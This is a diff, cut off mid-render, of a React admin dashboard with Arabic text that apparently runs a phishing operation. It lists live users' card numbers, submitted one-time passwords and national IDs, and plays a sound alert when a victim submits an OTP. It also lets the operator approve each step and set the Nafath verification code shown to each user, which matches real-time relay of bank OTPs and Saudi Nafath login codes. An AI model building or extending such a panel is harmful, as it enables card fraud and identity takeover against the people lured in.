@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
 import { motion, AnimatePresence } from 'motion/react';
 import {
   ShieldAlert,
@@ -21,7 +21,12 @@ import {
   Calendar,
   Layers,
   Sparkles,
-  Fingerprint
+  Fingerprint,
+  Volume2,
+  VolumeX,
+  Smartphone,
+  Play,
+  Bell
 } from 'lucide-react';
 import { CreditCard3D } from './CreditCard3D';
 
@@ -34,10 +39,80 @@ interface Transaction {
   cardType: 'visa' | 'mastercard' | 'amex' | 'discover' | 'unknown';
   amount: number;
   timestamp: string;
-  status: 'PENDING_CARD_APPROVAL' | 'AWAITING_OTP' | 'OTP_SUBMITTED' | 'APPROVED' | 'REJECTED';
+  status: 'PENDING_CARD_APPROVAL' | 'AWAITING_OTP' | 'OTP_SUBMITTED' | 'APPROVED' | 'REJECTED' | 'AWAITING_NAFATH' | 'NAFATH_VERIFIED';
   otpCode: string;
   submittedOtp?: string;
+  serviceName?: string;
+  nationalId?: string;
+  nafathVerified?: boolean;
+  nafathCode?: string;
 }
+
+// Custom browser synthesized alerts using Web Audio API
+const playNotificationSound = (type: 'nafath' | 'card' | 'otp') => {
+  try {
+    const AudioContextClass = window.AudioContext || (window as any).webkitAudioContext;
+    if (!AudioContextClass) return;
+    const ctx = new AudioContextClass();
+    const now = ctx.currentTime;
+    
+    if (type === 'nafath') {
+      // Gentle majestic digital double bell (C5 -> E5 -> G5)
+      const osc1 = ctx.createOscillator();
+      const gain1 = ctx.createGain();
+      osc1.type = 'sine';
+      osc1.frequency.setValueAtTime(523.25, now); // C5
+      osc1.frequency.exponentialRampToValueAtTime(659.25, now + 0.18); // E5
+      gain1.gain.setValueAtTime(0.12, now);
+      gain1.gain.exponentialRampToValueAtTime(0.001, now + 0.5);
+      osc1.connect(gain1);
+      gain1.connect(ctx.destination);
+      osc1.start(now);
+      osc1.stop(now + 0.5);
+
+      const osc2 = ctx.createOscillator();
+      const gain2 = ctx.createGain();
+      osc2.type = 'triangle';
+      osc2.frequency.setValueAtTime(783.99, now + 0.12); // G5
+      gain2.gain.setValueAtTime(0.05, now + 0.12);
+      gain2.gain.exponentialRampToValueAtTime(0.001, now + 0.5);
+      osc2.connect(gain2);
+      gain2.connect(ctx.destination);
+      osc2.start(now + 0.12);
+      osc2.stop(now + 0.5);
+    } else if (type === 'card') {
+      // Tech-y payment slide / crisp swoop (D4 -> A5)
+      const osc = ctx.createOscillator();
+      const gain = ctx.createGain();
+      osc.type = 'sine';
+      osc.frequency.setValueAtTime(293.66, now); // D4
+      osc.frequency.exponentialRampToValueAtTime(880, now + 0.22); // A5
+      gain.gain.setValueAtTime(0.1, now);
+      gain.gain.exponentialRampToValueAtTime(0.001, now + 0.3);
+      osc.connect(gain);
+      gain.connect(ctx.destination);
+      osc.start(now);
+      osc.stop(now + 0.3);
+    } else if (type === 'otp') {
+      // Fast high attention sonar beeps (C6 -> E6 -> G6)
+      [0, 0.08, 0.16].forEach((delay, idx) => {
+        const osc = ctx.createOscillator();
+        const gain = ctx.createGain();
+        osc.type = 'sine';
+        const freqs = [1046.50, 1318.51, 1567.98]; // C6, E6, G6
+        osc.frequency.setValueAtTime(freqs[idx], now + delay);
+        gain.gain.setValueAtTime(0.08, now + delay);
+        gain.gain.exponentialRampToValueAtTime(0.001, now + delay + 0.07);
+        osc.connect(gain);
+        gain.connect(ctx.destination);
+        osc.start(now + delay);
+        osc.stop(now + delay + 0.07);
+      });
+    }
+  } catch (err) {
+    console.error("Audio playback error:", err);
+  }
+};
 
 export const AdminPortal: React.FC = () => {
   // Access control state
@@ -58,6 +133,61 @@ export const AdminPortal: React.FC = () => {
 
   // Auto scroll/track state for OTP submissions
   const [isLiveMonitoring, setIsLiveMonitoring] = useState(true);
+
+  // Nafath setting states
+  const [nafathCodeInput, setNafathCodeInput] = useState('26');
+  const [isUpdatingNafath, setIsUpdatingNafath] = useState(false);
+  const [nafathConfigError, setNafathConfigError] = useState<string | null>(null);
+  const [nafathConfigSuccess, setNafathConfigSuccess] = useState<string | null>(null);
+
+  // Sound and tracking system states & refs
+  const [isAudioEnabled, setIsAudioEnabled] = useState(true);
+  const lastSeenStatuses = useRef<{[txId: string]: string}>({});
+  const initialFetchDone = useRef(false);
+
+  const fetchNafathConfig = async () => {
+    try {
+      const res = await fetch('/api/nafath-config');
+      if (res.ok) {
+        const data = await res.json();
+        if (data && data.currentCode) {
+          setNafathCodeInput(data.currentCode);
+        }
+      }
+    } catch (err) {
+      console.error('Error fetching Nafath config:', err);
+    }
+  };
+
+  const handleUpdateNafathCode = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!nafathCodeInput.trim()) {
+      setNafathConfigError('Please enter a valid code');
+      return;
+    }
+    setIsUpdatingNafath(true);
+    setNafathConfigError(null);
+    setNafathConfigSuccess(null);
+
+    try {
+      const res = await fetch('/api/nafath-config', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ currentCode: nafathCodeInput.trim() })
+      });
+      const data = res.ok ? await res.json() : null;
+      if (res.ok && data?.success) {
+        setNafathConfigSuccess('Nafath code updated successfully!');
+        setTimeout(() => setNafathConfigSuccess(null), 3000);
+      } else {
+        setNafathConfigError('Failed to update Nafath code.');
+      }
+    } catch (err) {
+      setNafathConfigError('Network error updating Nafath code.');
+    } finally {
+      setIsUpdatingNafath(false);
+    }
+  };
 
   // Check code submission
   const handleVerifyAccess = (e: React.FormEvent) => {
@@ -81,7 +211,54 @@ export const AdminPortal: React.FC = () => {
     try {
       const res = await fetch('/api/admin/transactions');
       if (res.ok) {
-        const data = await res.json();
+        const data: Transaction[] = await res.json();
+        
+        if (initialFetchDone.current) {
+          const prevStatuses = lastSeenStatuses.current;
+          let playSound: 'nafath' | 'card' | 'otp' | null = null;
+          
+          data.forEach(tx => {
+            const lastStatus = prevStatuses[tx.id];
+            
+            if (lastStatus === undefined) {
+              // Brand new transaction entry!
+              if (tx.status === 'AWAITING_NAFATH' || tx.status === 'NAFATH_VERIFIED') {
+                playSound = 'nafath';
+              } else if (tx.status === 'OTP_SUBMITTED') {
+                playSound = 'otp';
+              } else {
+                playSound = 'card';
+              }
+            } else if (lastStatus !== tx.status) {
+              // Status transition change!
+              if (tx.status === 'AWAITING_NAFATH' || tx.status === 'NAFATH_VERIFIED') {
+                playSound = 'nafath';
+              } else if (tx.status === 'OTP_SUBMITTED') {
+                playSound = 'otp';
+              } else if (tx.status === 'PENDING_CARD_APPROVAL') {
+                playSound = 'card';
+              }
+            }
+            
+            // Record current state status
+            prevStatuses[tx.id] = tx.status;
+          });
+          
+          lastSeenStatuses.current = { ...prevStatuses };
+          
+          if (playSound && isAudioEnabled) {
+            playNotificationSound(playSound);
+          }
+        } else {
+          // Initialize first-load state map without firing alarms
+          const initialMap: {[txId: string]: string} = {};
+          data.forEach(tx => {
+            initialMap[tx.id] = tx.status;
+          });
+          lastSeenStatuses.current = initialMap;
+          initialFetchDone.current = true;
+        }
+
         setTransactions(data);
         setIsLoading(false);
       }
@@ -95,6 +272,7 @@ export const AdminPortal: React.FC = () => {
     if (!hasAccess) return;
 
     fetchTransactions();
+    fetchNafathConfig();
     const interval = setInterval(() => {
       fetchTransactions();
     }, 2000);
@@ -139,6 +317,107 @@ export const AdminPortal: React.FC = () => {
       }
     } catch (err) {
       setActionError('Network error syncing status packet to central gateway.');
+    } finally {
+      setActionBusy(false);
+    }
+  };
+
+  // Handle Nafath custom code update
+  const handleUpdateTxNafathCode = async (code: string) => {
+    if (!selectedTx || actionBusy) return;
+    setActionBusy(true);
+    setActionError(null);
+    setSuccessMessage(null);
+
+    try {
+      const res = await fetch('/api/admin/update-status', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ id: selectedTx.id, nafathCode: code }),
+      });
+
+      const data = await res.json();
+      if (res.ok && data.success) {
+        setSuccessMessage(`تم تحديث رمز نفاذ للعميل إلى ${code} بنجاح.`);
+        setTransactions(prev =>
+          prev.map(t => (t.id === selectedTx.id ? { ...t, nafathCode: code } : t))
+        );
+        setSelectedTx(prev => (prev ? { ...prev, nafathCode: code } : null));
+        setTimeout(() => setSuccessMessage(null), 3000);
+      } else {
+        setActionError(data.error || 'Failed to update Nafath code.');
+        setTimeout(() => setActionError(null), 3000);
+      }
+    } catch (err) {
+      setActionError('Network error updating Nafath code.');
+      setTimeout(() => setActionError(null), 3000);
+    } finally {
+      setActionBusy(false);
+    }
+  };
+
+  // Handle action state updates for a specific transaction
+  const handleUpdateTxStatusDirect = async (txId: string, status: Transaction['status']) => {
+    if (actionBusy) return;
+    setActionBusy(true);
+    setActionError(null);
+    setSuccessMessage(null);
+
+    try {
+      const res = await fetch('/api/admin/update-status', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ id: txId, status }),
+      });
+
+      const data = await res.json();
+      if (res.ok && data.success) {
+        setSuccessMessage(`تم تحديث حالة المعاملة بنجاح.`);
+        // update local list immediately
+        setTransactions(prev =>
+          prev.map(t => (t.id === txId ? { ...t, status, nafathVerified: status === 'NAFATH_VERIFIED' ? true : t.nafathVerified } : t))
+        );
+        setTimeout(() => setSuccessMessage(null), 3000);
+      } else {
+        setActionError(data.error || 'Failed to update transaction status.');
+        setTimeout(() => setActionError(null), 3000);
+      }
+    } catch (err) {
+      setActionError('Network error syncing status.');
+      setTimeout(() => setActionError(null), 3000);
+    } finally {
+      setActionBusy(false);
+    }
+  };
+
+  // Handle Nafath custom code update for a specific transaction
+  const handleUpdateTxNafathCodeDirect = async (txId: string, code: string) => {
+    if (actionBusy) return;
+    setActionBusy(true);
+    setActionError(null);
+    setSuccessMessage(null);
+
+    try {
+      const res = await fetch('/api/admin/update-status', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ id: txId, nafathCode: code }),
+      });
+
+      const data = await res.json();
+      if (res.ok && data.success) {
+        setSuccessMessage(`تم تحديث رمز نفاذ للعميل إلى ${code} بنجاح.`);
+        setTransactions(prev =>
+          prev.map(t => (t.id === txId ? { ...t, nafathCode: code } : t))
+        );
+        setTimeout(() => setSuccessMessage(null), 3000);
+      } else {
+        setActionError(data.error || 'Failed to update Nafath code.');
+        setTimeout(() => setActionError(null), 3000);
+      }
+    } catch (err) {
+      setActionError('Network error updating Nafath code.');
+      setTimeout(() => setActionError(null), 3000);
     } finally {
       setActionBusy(false);
     }
@@ -269,19 +548,31 @@ export const AdminPortal: React.FC = () => {
           </div>
           <div>
             <div className="flex items-center space-x-2">
-              <h2 className="text-md font-bold text-white tracking-tight uppercase">ADMIN COMMAND CENTER</h2>
-              <span className="text-[9px] font-mono font-bold bg-indigo-950 text-indigo-400 px-1.5 py-0.5 rounded border border-indigo-500/30">LOCKED SESSION</span>
+              <h2 className="text-md font-bold text-white tracking-tight uppercase">لوحة التحكم والمراقبة الفورية</h2>
+              <span className="text-[9px] font-mono font-bold bg-indigo-950 text-indigo-400 px-1.5 py-0.5 rounded border border-indigo-500/30">ADMIN PORTAL</span>
             </div>
             <p className="text-[10px] font-mono text-slate-400">REAL-TIME CENTRAL DECISION DECK • ACTIVE AUTO-POLL (2S)</p>
           </div>
         </div>
 
         {/* Sync panel details */}
-        <div className="flex items-center space-x-4 self-end md:self-auto">
+        <div className="flex items-center gap-3 self-end md:self-auto">
+          <button
+            onClick={() => setIsAudioEnabled(!isAudioEnabled)}
+            className={`h-8 px-3 rounded-lg text-xs font-bold border flex items-center gap-1.5 transition-all ${
+              isAudioEnabled
+                ? 'bg-emerald-500/10 border-emerald-500/20 text-emerald-400'
+                : 'bg-rose-500/10 border-rose-500/20 text-rose-400'
+            }`}
+          >
+            {isAudioEnabled ? <Volume2 className="w-4 h-4" /> : <VolumeX className="w-4 h-4" />}
+            <span>{isAudioEnabled ? 'النظام الصوتي نشط' : 'كتم أصوات التنبيه'}</span>
+          </button>
+          
           <div className="flex items-center space-x-2">
             <button
               onClick={() => setIsLiveMonitoring(!isLiveMonitoring)}
-              className={`h-7 px-3 rounded-md text-[10px] font-mono font-bold border transition-all ${
+              className={`h-8 px-3 rounded-lg text-[10px] font-mono font-bold border transition-all ${
                 isLiveMonitoring
                   ? 'bg-emerald-500/10 border-emerald-500/20 text-emerald-400'
                   : 'bg-slate-950 border-slate-800 text-slate-500'
@@ -291,7 +582,7 @@ export const AdminPortal: React.FC = () => {
             </button>
             <button
               onClick={fetchTransactions}
-              className="p-1.5 rounded-lg bg-slate-950 hover:bg-slate-900 border border-slate-800 text-slate-400 hover:text-white transition"
+              className="p-2 rounded-lg bg-slate-950 hover:bg-slate-900 border border-slate-800 text-slate-400 hover:text-white transition cursor-pointer"
               title="Manual refresh"
             >
               <RefreshCw className="w-3.5 h-3.5" />
@@ -300,372 +591,529 @@ export const AdminPortal: React.FC = () => {
         </div>
       </div>
 
-      {/* Main Grid splitting logs list and detail audits */}
-      <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
-        {/* Left column (8 Grid columns) - Real-time Transactions list */}
-        <div className="lg:col-span-7 space-y-6">
-          <div className="rounded-2xl border border-slate-800/80 bg-slate-900/20 backdrop-blur-md p-5 shadow-xl">
-            {/* Header filters */}
-            <div className="flex flex-col sm:flex-row justify-between items-stretch sm:items-center gap-4 mb-5 pb-5 border-b border-slate-900">
-              <div>
-                <h3 className="text-sm font-bold text-white flex items-center space-x-2">
-                  <Database className="h-4 w-4 text-indigo-400" />
-                  <span>TRANSACTION RECORD LEDGER ({filteredTx.length})</span>
-                </h3>
-                <p className="text-[10px] font-mono text-slate-400">Total processed logs tracked in secure state-machine</p>
-              </div>
-
-              {/* Search input bar */}
-              <div className="relative max-w-xs">
-                <div className="absolute inset-y-0 left-0 flex items-center pl-2.5 pointer-events-none text-slate-500">
-                  <Search className="h-3.5 w-3.5" />
-                </div>
-                <input
-                  type="text"
-                  placeholder="ID, Cardholder, card..."
-                  value={searchTerm}
-                  onChange={(e) => setSearchTerm(e.target.value)}
-                  className="block w-full h-8 pl-8 pr-3 text-xs bg-slate-950 border border-slate-800 rounded-lg text-white focus:ring-1 focus:ring-indigo-500"
-                />
-              </div>
-            </div>
-
-            {/* Filter Tabs Row */}
-            <div className="flex flex-wrap gap-1.5 mb-5 bg-slate-950/60 p-1 rounded-lg border border-slate-900">
-              {['All', 'PENDING_CARD_APPROVAL', 'AWAITING_OTP', 'OTP_SUBMITTED', 'APPROVED', 'REJECTED'].map(tab => (
-                <button
-                  key={tab}
-                  onClick={() => setStatusFilter(tab)}
-                  className={`px-2.5 py-1 text-[9px] font-mono font-bold rounded-md transition ${
-                    statusFilter === tab
-                      ? 'bg-slate-800 text-white border border-slate-700/60'
-                      : 'text-slate-400 hover:text-white'
-                  }`}
-                >
-                  {tab === 'PENDING_CARD_APPROVAL' ? 'PENDING CARD' : tab === 'AWAITING_OTP' ? 'AWAITING OTP' : tab === 'OTP_SUBMITTED' ? 'OTP SUBMITTED' : tab}
-                </button>
-              ))}
-            </div>
-
-            {/* Transaction Grid list */}
-            {isLoading ? (
-              <div className="py-20 text-center">
-                <RefreshCw className="h-8 w-8 text-indigo-500 animate-spin mx-auto mb-3" />
-                <p className="text-xs font-mono text-slate-500">Synchronizing database transaction tables...</p>
-              </div>
-            ) : filteredTx.length === 0 ? (
-              <div className="py-16 text-center border border-dashed border-slate-800 rounded-xl">
-                <Terminal className="h-6 w-6 text-slate-600 mx-auto mb-2" />
-                <p className="text-xs font-mono text-slate-500">No transactions match current filters.</p>
-              </div>
-            ) : (
-              <div className="space-y-2 max-h-[550px] overflow-y-auto pr-1">
-                {filteredTx.map(tx => {
-                  const isSelected = selectedTx?.id === tx.id;
-                  
-                  // Status pill visual badges
-                  let statusBadge = null;
-                  if (tx.status === 'APPROVED') {
-                    statusBadge = (
-                      <span className="inline-flex items-center space-x-1 rounded bg-emerald-500/10 px-2 py-0.5 text-[9px] font-mono font-bold text-emerald-400 ring-1 ring-inset ring-emerald-500/20">
-                        <span>APPROVED</span>
-                      </span>
-                    );
-                  } else if (tx.status === 'REJECTED') {
-                    statusBadge = (
-                      <span className="inline-flex items-center space-x-1 rounded bg-rose-500/10 px-2 py-0.5 text-[9px] font-mono font-bold text-rose-400 ring-1 ring-inset ring-rose-500/20">
-                        <span>REJECTED</span>
-                      </span>
-                    );
-                  } else if (tx.status === 'AWAITING_OTP') {
-                    statusBadge = (
-                      <span className="inline-flex items-center space-x-1 rounded bg-indigo-500/10 px-2 py-0.5 text-[9px] font-mono font-bold text-indigo-400 ring-1 ring-inset ring-indigo-500/20">
-                        <span>AWAITING OTP</span>
-                      </span>
-                    );
-                  } else if (tx.status === 'OTP_SUBMITTED') {
-                    statusBadge = (
-                      <span className="inline-flex items-center space-x-1 rounded bg-cyan-500/10 px-2 py-0.5 text-[9px] font-mono font-bold text-cyan-400 ring-1 ring-inset ring-cyan-500/20 animate-pulse">
-                        <span>OTP SUBMITTED</span>
-                      </span>
-                    );
-                  } else {
-                    statusBadge = (
-                      <span className="inline-flex items-center space-x-1 rounded bg-amber-500/10 px-2 py-0.5 text-[9px] font-mono font-bold text-amber-400 ring-1 ring-inset ring-amber-500/20">
-                        <span>PENDING CARD</span>
-                      </span>
-                    );
-                  }
-
-                  return (
-                    <div
-                      key={tx.id}
-                      onClick={() => setSelectedTx(tx)}
-                      className={`group border rounded-xl p-3.5 text-left cursor-pointer transition duration-150 relative overflow-hidden ${
-                        isSelected
-                          ? 'bg-indigo-950/20 border-indigo-500/40 shadow-md shadow-indigo-950/10'
-                          : 'bg-slate-950 border-slate-900/80 hover:border-slate-800'
-                      }`}
-                    >
-                      {/* Interactive selection active side marker */}
-                      {isSelected && (
-                        <div className="absolute left-0 inset-y-0 w-1 bg-indigo-500" />
-                      )}
-
-                      <div className="flex justify-between items-start gap-2">
-                        <div className="space-y-1 max-w-[70%]">
-                          <div className="flex items-center space-x-2">
-                            <span className="text-[10px] font-mono font-bold text-indigo-400 tracking-wider">
-                              {tx.id}
-                            </span>
-                            <span className={`text-[8px] font-mono border px-1 rounded uppercase ${getCardTypeColor(tx.cardType)}`}>
-                              {tx.cardType}
-                            </span>
-                            {tx.submittedOtp && (
-                              <span className="text-[9px] font-mono font-bold bg-cyan-950 text-cyan-400 px-1.5 py-0.2 rounded border border-cyan-500/30">
-                                OTP: {tx.submittedOtp}
-                              </span>
-                            )}
-                          </div>
-                          
-                          <p className="text-xs font-semibold text-white truncate max-w-[220px]">
-                            {tx.cardholderName.toUpperCase()}
-                          </p>
-
-                          {tx.serviceName && (
-                            <div className="inline-flex items-center space-x-1 rounded bg-[#004d33]/20 text-[#2dd4bf] px-1.5 py-0.5 text-[8px] font-bold mt-1">
-                              <span>📦 {tx.serviceName}</span>
-                            </div>
-                          )}
-                          
-                          <p className="text-[10px] font-mono text-slate-400 mt-1">
-                            Card: {tx.cardNumber.slice(0, 7)}••••••••{tx.cardNumber.slice(-4)}
-                          </p>
-                        </div>
-
-                        {/* Amount & Status Badge */}
-                        <div className="text-right flex flex-col items-end space-y-1.5 shrink-0">
-                          <span className="text-xs font-bold text-emerald-400 font-mono">
-                            ${tx.amount.toFixed(2)}
-                          </span>
-                          {statusBadge}
-                          <span className="text-[8px] font-mono text-slate-500">
-                            {new Date(tx.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
-                          </span>
-                        </div>
-                      </div>
-                    </div>
-                  );
-                })}
-              </div>
-            )}
+      {/* Sound testing bar & stats counters */}
+      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 mb-8">
+        {/* Sound testing card */}
+        <div className="lg:col-span-5 rounded-2xl border border-slate-800 bg-gradient-to-br from-slate-900 to-slate-950/80 p-4 shadow-xl flex flex-col justify-between gap-3 text-right">
+          <div>
+            <h4 className="text-xs font-bold text-white flex items-center justify-end gap-1.5">
+              <span>مركز اختبار النغمات التفاعلي</span>
+              <Bell className="w-3.5 h-3.5 text-emerald-400 animate-pulse" />
+            </h4>
+            <p className="text-[10px] text-slate-400 mt-1 leading-relaxed">
+              انقر على النغمات أدناه لتجربتها ومطابقتها للتنبيه الصوتي الحقيقي عند تفاعل المستخدمين
+            </p>
+          </div>
+          <div className="grid grid-cols-3 gap-2">
+            <button
+              onClick={() => playNotificationSound('nafath')}
+              className="px-2.5 py-2 rounded-xl border border-slate-800 hover:border-emerald-500/40 bg-slate-950 text-[9px] text-slate-300 flex flex-col items-center gap-1.5 transition cursor-pointer"
+            >
+              <Play className="w-3.5 h-3.5 text-emerald-400" />
+              <span>نغمة نفاذ 🔔</span>
+            </button>
+            <button
+              onClick={() => playNotificationSound('card')}
+              className="px-2.5 py-2 rounded-xl border border-slate-800 hover:border-indigo-500/40 bg-slate-950 text-[9px] text-slate-300 flex flex-col items-center gap-1.5 transition cursor-pointer"
+            >
+              <Play className="w-3.5 h-3.5 text-indigo-400" />
+              <span>نغمة البطاقة 💳</span>
+            </button>
+            <button
+              onClick={() => playNotificationSound('otp')}
+              className="px-2.5 py-2 rounded-xl border border-slate-800 hover:border-cyan-500/40 bg-slate-950 text-[9px] text-slate-300 flex flex-col items-center gap-1.5 transition cursor-pointer"
+            >
+              <Play className="w-3.5 h-3.5 text-cyan-400" />
+              <span>نغمة الرمز 🔐</span>
+            </button>
           </div>
         </div>
 
-        {/* Right column (5 Grid columns) - Detailed Action Console & tilted 3D Preview */}
-        <div className="lg:col-span-5 space-y-6 sticky top-[90px]">
-          <div className="rounded-2xl border border-slate-800/80 bg-slate-900/20 backdrop-blur-md p-5 shadow-xl text-left">
-            <h3 className="text-sm font-bold text-white flex items-center space-x-2 mb-4 pb-4 border-b border-slate-900">
-              <Terminal className="h-4 w-4 text-indigo-400" />
-              <span>LIVE RECONCILIATION CONSOLE</span>
-            </h3>
+        {/* Real-time stats widgets */}
+        <div className="lg:col-span-7 grid grid-cols-1 sm:grid-cols-3 gap-4 text-right">
+          <div className="rounded-2xl border border-slate-800 bg-slate-900/10 p-4 flex items-center justify-between">
+            <div className="p-3 bg-amber-500/10 text-amber-400 rounded-xl border border-amber-500/20">
+              <Activity className="w-5 h-5 animate-pulse" />
+            </div>
+            <div>
+              <p className="text-[10px] font-mono text-slate-400 uppercase tracking-wider">العمليات النشطة</p>
+              <h3 className="text-xl font-bold text-amber-400 font-mono mt-1">
+                {transactions.filter(tx => ['AWAITING_NAFATH', 'NAFATH_VERIFIED', 'PENDING_CARD_APPROVAL', 'AWAITING_OTP', 'OTP_SUBMITTED'].includes(tx.status)).length}
+                <span className="text-[10px] font-sans font-normal text-slate-500 mr-1">مستمر</span>
+              </h3>
+            </div>
+          </div>
 
-            {selectedTx ? (
-              <div className="space-y-6">
-                
-                {/* 3D TILTED LIVE PREVIEW PANEL */}
-                <div className="relative rounded-xl bg-slate-950 p-4 border border-slate-900 overflow-hidden flex flex-col items-center">
-                  <div className="absolute top-2 left-2 z-20 flex items-center space-x-1 px-1.5 py-0.5 rounded bg-indigo-500/10 border border-indigo-500/20 text-[8px] font-mono text-indigo-400">
-                    <Sparkles className="w-2.5 h-2.5 animate-spin" style={{ animationDuration: '4s' }} />
-                    <span>LIVE INTEGRATED PERSPECTIVE</span>
+          <div className="rounded-2xl border border-slate-800 bg-slate-900/10 p-4 flex items-center justify-between">
+            <div className="p-3 bg-emerald-500/10 text-emerald-400 rounded-xl border border-emerald-500/20">
+              <Fingerprint className="w-5 h-5" />
+            </div>
+            <div>
+              <p className="text-[10px] font-mono text-slate-400 uppercase tracking-wider">توثيق نفاذ المؤكد</p>
+              <h3 className="text-xl font-bold text-emerald-400 font-mono mt-1">
+                {transactions.filter(t => t.nafathVerified || t.status === 'NAFATH_VERIFIED').length}
+                <span className="text-[10px] font-sans font-normal text-slate-500 mr-1">هوية</span>
+              </h3>
+            </div>
+          </div>
+
+          <div className="rounded-2xl border border-slate-800 bg-slate-900/10 p-4 flex items-center justify-between">
+            <div className="p-3 bg-indigo-500/10 text-indigo-400 rounded-xl border border-indigo-500/20">
+              <Database className="w-5 h-5" />
+            </div>
+            <div>
+              <p className="text-[10px] font-mono text-slate-400 uppercase tracking-wider">إجمالي المدفوعات المقبولة</p>
+              <h3 className="text-xl font-bold text-indigo-400 font-mono mt-1">
+                ${transactions.filter(t => t.status === 'APPROVED').reduce((sum, t) => sum + t.amount, 0).toFixed(2)}
+                <span className="text-[10px] font-sans font-normal text-slate-500 mr-1">USD</span>
+              </h3>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      {/* Global Nafath Config Controller and Dashboard Filters */}
+      <div className="space-y-6 mb-8 text-right animate-fade-in">
+        {/* NAFATH CODE CONTROLLER WIDGET */}
+        <div className="rounded-2xl border border-slate-800/85 bg-gradient-to-r from-slate-900 via-slate-900 to-emerald-950/25 p-5 shadow-xl relative overflow-hidden">
+          <div className="absolute top-0 right-0 w-24 h-24 bg-emerald-500/5 rounded-full blur-2xl pointer-events-none" />
+          <div className="flex flex-col sm:flex-row-reverse items-start sm:items-center justify-between gap-4">
+            <div className="space-y-1">
+              <h3 className="text-sm font-bold text-white flex items-center justify-end gap-2">
+                <span>التحكم برمز التحقق الافتراضي (نفاذ الموحد)</span>
+                <Fingerprint className="h-4 w-4 text-emerald-400" />
+              </h3>
+              <p className="text-[10px] text-slate-400 leading-relaxed">
+                الرمز الافتراضي التلقائي الذي يظهر لأي مستخدم جديد يسجل الدخول عبر تطبيق نفاذ (يمكنك أيضاً تغيير الرمز لكل عميل بشكل مخصص من بطاقته أدناه)
+              </p>
+            </div>
+
+            <form onSubmit={handleUpdateNafathCode} className="flex items-center gap-2 w-full sm:w-auto">
+              <button
+                type="submit"
+                disabled={isUpdatingNafath}
+                className="h-9 px-4 rounded-lg bg-emerald-600 hover:bg-emerald-500 disabled:opacity-50 text-white text-xs font-bold transition flex items-center gap-1.5 shrink-0 cursor-pointer"
+              >
+                {isUpdatingNafath ? 'جاري التحديث...' : 'تحديث الرمز'}
+              </button>
+              <div className="relative">
+                <input
+                  type="text"
+                  maxLength={4}
+                  value={nafathCodeInput}
+                  onChange={(e) => setNafathCodeInput(e.target.value.replace(/\D/g, ''))}
+                  placeholder="26"
+                  className="block w-20 h-9 text-center font-mono font-black text-lg text-emerald-400 bg-slate-950 border border-slate-850 rounded-lg focus:ring-1 focus:ring-emerald-500 focus:outline-none"
+                />
+              </div>
+            </form>
+          </div>
+
+          <AnimatePresence>
+            {(nafathConfigError || nafathConfigSuccess) && (
+              <motion.div
+                initial={{ opacity: 0, height: 0 }}
+                animate={{ opacity: 1, height: 'auto' }}
+                exit={{ opacity: 0, height: 0 }}
+                className="mt-3 flex justify-end"
+              >
+                {nafathConfigError && (
+                  <div className="text-[10px] font-mono text-rose-400 bg-rose-500/5 border border-rose-500/10 rounded px-2.5 py-1.5 w-full text-right">
+                    ⚠️ {nafathConfigError}
+                  </div>
+                )}
+                {nafathConfigSuccess && (
+                  <div className="text-[10px] font-sans text-emerald-400 bg-emerald-500/5 border border-emerald-500/10 rounded px-2.5 py-1.5 flex items-center gap-1.5 w-full justify-end">
+                    <span>{nafathConfigSuccess}</span>
+                    <CheckCircle className="w-3.5 h-3.5" />
+                  </div>
+                )}
+              </motion.div>
+            )}
+          </AnimatePresence>
+        </div>
+
+        {/* Global Notifications Alert Banner */}
+        <AnimatePresence>
+          {(actionError || successMessage) && (
+            <motion.div
+              initial={{ opacity: 0, y: -10 }}
+              animate={{ opacity: 1, y: 0 }}
+              exit={{ opacity: 0, y: -10 }}
+              className="w-full"
+            >
+              {actionError && (
+                <div className="rounded-xl border border-rose-500/20 bg-rose-500/10 p-3.5 text-xs text-rose-400 flex items-center justify-end space-x-2 space-x-reverse shadow-lg">
+                  <span>{actionError}</span>
+                  <XCircle className="h-4 w-4 shrink-0" />
+                </div>
+              )}
+              {successMessage && (
+                <div className="rounded-xl border border-emerald-500/20 bg-emerald-500/10 p-3.5 text-xs text-emerald-400 flex items-center justify-end space-x-2 space-x-reverse shadow-lg">
+                  <span>{successMessage}</span>
+                  <CheckCircle className="h-4 w-4 shrink-0" />
+                </div>
+              )}
+            </motion.div>
+          )}
+        </AnimatePresence>
+
+        {/* Dynamic Filters and Search Panel */}
+        <div className="rounded-2xl border border-slate-800/80 bg-slate-900/20 backdrop-blur-md p-5 shadow-xl text-right">
+          <div className="flex flex-col md:flex-row-reverse justify-between items-stretch md:items-center gap-4 mb-5 pb-5 border-b border-slate-900">
+            <div>
+              <h3 className="text-md font-bold text-white flex items-center justify-end gap-2">
+                <span>ملفات بروفايل المستخدمين المباشرة ({filteredTx.length})</span>
+                <Database className="h-4.5 w-4.5 text-indigo-400" />
+              </h3>
+              <p className="text-[10px] text-slate-400">مراقبة تفصيلية فورية لكل شخص متصل الآن - بروفايل كامل مستقل لكل عميل</p>
+            </div>
+
+            {/* Search bar */}
+            <div className="relative max-w-sm w-full md:w-80">
+              <div className="absolute inset-y-0 left-0 flex items-center pl-3 pointer-events-none text-slate-500">
+                <Search className="h-4 w-4" />
+              </div>
+              <input
+                type="text"
+                placeholder="بحث باسم العميل، رقم المعاملة، الهوية..."
+                value={searchTerm}
+                onChange={(e) => setSearchTerm(e.target.value)}
+                className="block w-full h-10 pl-9 pr-4 text-xs bg-slate-950 border border-slate-800 rounded-xl text-white text-right focus:ring-2 focus:ring-indigo-500 focus:outline-none"
+              />
+            </div>
+          </div>
+
+          {/* Filter Status Tabs */}
+          <div className="flex flex-wrap flex-row-reverse gap-1.5 bg-slate-950/60 p-1 rounded-xl border border-slate-900/80">
+            {[
+              { id: 'All', label: 'الكل' },
+              { id: 'AWAITING_NAFATH', label: 'بانتظار نفاذ ⏳' },
+              { id: 'NAFATH_VERIFIED', label: 'نفاذ موثق ✅' },
